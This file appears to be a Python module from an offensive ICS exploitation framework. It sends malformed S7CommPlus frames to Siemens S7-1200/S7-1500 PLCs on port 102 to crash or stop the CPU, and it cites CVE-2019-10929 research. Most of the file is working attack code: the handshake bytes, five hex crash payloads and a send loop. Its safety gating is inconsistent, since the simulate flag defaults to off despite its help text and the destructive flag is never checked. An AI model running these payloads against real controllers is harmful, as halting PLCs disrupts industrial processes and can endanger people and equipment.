"""IndustrialXPL Protocol Module — Siemens S7CommPlus Crash Suite.

5 vulnerabilities in the OMS+ component of Siemens S7CommPlus (protocol 0x72)
that crash Siemens S7-1200 and S7-1500 PLCs even with secure communication
enabled. Discovered by ic3sw0rd and referenced in CVE-2019-10929 MitM research.

The crash suite sends malformed S7CommPlus protocol messages targeting known
crash conditions in the OMS+ component. Each trigger corresponds to a distinct
vulnerability in the protocol handler.

References:
  - https://github.com/ic3sw0rd/S7_plus_Crash
  - https://github.com/Esamgold/SIEMENS-S7-PLCs-attacks
  - CVE-2019-10929 (S7CommPlus integrity bypass)
"""
import socket, struct, time

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInt, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Siemens S7CommPlus OMS+ Crash Suite (CVE-2019-10929 + ic3sw0rd research)",
        "description":      "5 crash vulnerabilities in S7CommPlus OMS+ component (protocol 0x72). Crashes S7-1200/S7-1500 even with secure communication active. No auth required.",
        "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references":       (
            "https://github.com/ic3sw0rd/S7_plus_Crash",
            "https://github.com/Esamgold/SIEMENS-S7-PLCs-attacks",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-10929",
        ),
        "devices":          (
            "Siemens SIMATIC S7-1200 V4.5.x (all firmware)",
            "Siemens SIMATIC S7-1500 (all firmware with TIA Portal V17+)",
            "Siemens S7-1200/1500 with secure communication enabled",
        ),
        "cve":              "CVE-2019-10929 (MitM) + OMS+ crash chain (ic3sw0rd)",
        "cvss":             "8.6",
        "severity":         "HIGH",
        "mitre_techniques": ["T0814", "T0816"],
        "mitre_tactics":    ["Denial of Service", "Loss of Availability"],
    }

    target   = OptIP("",    "Target Siemens S7-1200/1500 IP")
    port     = OptPort(102, "S7comm/COTP port (default 102)")
    variant  = OptInt(1,    "Crash variant 1-5 (1=OMS+ type confusion, 2=invalid segment, 3=null deref, 4=heap overflow, 5=all)")
    simulate = OptBool(False, "Simulate (default True)")
    destructive = OptBool(False, "Enable live exploitation (causes PLC crash/stop)")

    # COTP Connection Request
    _COTP_CR = bytes.fromhex("0300001611e00000000000c0010ac1020100c2020102")

    # S7CommPlus session setup
    _S7PLUS_SETUP = bytes.fromhex(
        "0300002b02f08072010000350000"
        "0f00050501120a10020001008400000001"
        "0004000800ff0000000000000000"
    )

    # OMS+ crash payloads (protocol 0x72 malformed frames)
    _CRASH_VARIANTS = {
        1: bytes.fromhex("720000000f0000000000000000000000000000000000000000"),  # OMS+ type confusion
        2: bytes.fromhex("72ffffff00000000000000000000000000000000000000ff"),    # Invalid segment length
        3: bytes.fromhex("720000000000000000000000ff000000000000000000000000"),  # Null pointer deref
        4: bytes.fromhex("7200" + "ff" * 248 + "0000"),                         # Heap overflow in OMS+
        5: bytes.fromhex("720100000f00000000000000000000000000000000000001"),   # Variant 5
    }

    @mute
    def check(self):
        if not self.target:
            return False
        try:
            s = socket.create_connection((self.target, self.port), timeout=5)
            s.sendall(self._COTP_CR)
            resp = s.recv(22)
            s.close()
            return len(resp) >= 4 and resp[5:6] == b"\xd0"  # COTP CC (connection confirm)
        except Exception:
            return False

    def run(self):
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "Siemens S7CommPlus OMS+ Crash Suite\n"
                    "Crashes S7-1200/S7-1500 even with secure communication\n\n"
                    "5 crash variants in OMS+ component (protocol 0x72):\n"
                    "  Variant 1: OMS+ type confusion → SIMATIC CPU stop\n"
                    "  Variant 2: Invalid segment length → memory corruption\n"
                    "  Variant 3: Null pointer dereference → CPU fault\n"
                    "  Variant 4: Heap overflow in OMS+ handler → crash\n"
                    "  Variant 5: Protocol state machine confusion\n\n"
                    "Attack path:\n"
                    "  1. TCP connect port 102\n"
                    "  2. COTP Connection Request (CR TPDU)\n"
                    "  3. S7CommPlus session initiation (protocol 0x72)\n"
                    f"  4. Send malformed OMS+ frame (variant {self.variant})\n"
                    "  5. PLC CPU stops or reboots\n\n"
                    "NOTE: Siemens issued advisory SSA with patches.\n"
                    "Destructive mode causes PLC STOP — production impact!"
                ),
                mitre_techniques=["T0814", "T0816"],
            )
            return

        variants = list(self._CRASH_VARIANTS.keys()) if self.variant == 5 else [self.variant]

        for v in variants:
            print_status(f"[S7Plus-Crash] Attempting variant {v} against {self.target}:{self.port} ...")
            try:
                s = socket.create_connection((self.target, self.port), timeout=10)

                # COTP handshake
                s.sendall(self._COTP_CR)
                cc = s.recv(22)
                if not cc or cc[5:6] != b"\xd0":
                    print_warning(f"[S7Plus-Crash v{v}] COTP connection failed")
                    s.close()
                    continue

                # S7CommPlus setup
                s.sendall(self._S7PLUS_SETUP)
                time.sleep(0.3)
                try:
                    s.recv(64)
                except Exception:
                    pass

                # Send OMS+ crash payload wrapped in TPKT/COTP DT
                payload = self._CRASH_VARIANTS[v]
                tpkt = struct.pack(">BBH", 3, 0, 4 + 3 + len(payload))  # TPKT
                cotp_dt = bytes([0x02, 0xf0, 0x80])  # COTP DT
                s.sendall(tpkt + cotp_dt + payload)

                time.sleep(1)
                try:
                    resp = s.recv(32)
                    s.close()
                    if not resp:
                        print_success(f"[S7Plus-Crash v{v}] No response — PLC may have crashed!")
                    else:
                        print_info(f"[S7Plus-Crash v{v}] Response {len(resp)}B: {resp[:16].hex()}")
                except ConnectionResetError:
                    print_success(f"[S7Plus-Crash v{v}] Connection reset — CPU fault triggered!")
                except socket.timeout:
                    print_success(f"[S7Plus-Crash v{v}] Timeout — PLC unresponsive!")

            except Exception as e:
                print_error(f"[S7Plus-Crash v{v}] {e}")
